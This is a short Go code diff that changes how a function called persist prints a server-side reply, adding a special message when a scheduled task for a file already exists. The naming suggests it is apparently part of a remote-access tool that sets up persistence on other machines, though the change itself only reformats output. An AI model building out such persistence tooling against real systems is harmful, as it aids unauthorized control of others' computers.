@@ -333,7 +333,13 @@ func persist(conn *net.Conn, fileName string) {
 	}
 	bufferSnapped = buffer[:read_len]
 	bufferStr = string(bufferSnapped)
-	fmt.Println("[!]" + bufferStr)
+	fmt.Println()
+	if strings.Contains(bufferStr, "already exists") {
+		fmt.Println("[!]The scheduled task for " + fileName + " already exists ...")
+		fmt.Println() //Just some beautification of output server side
+	} else {
+		fmt.Println("[!]" + bufferStr)
+	}
 }
 
 // Continue this later
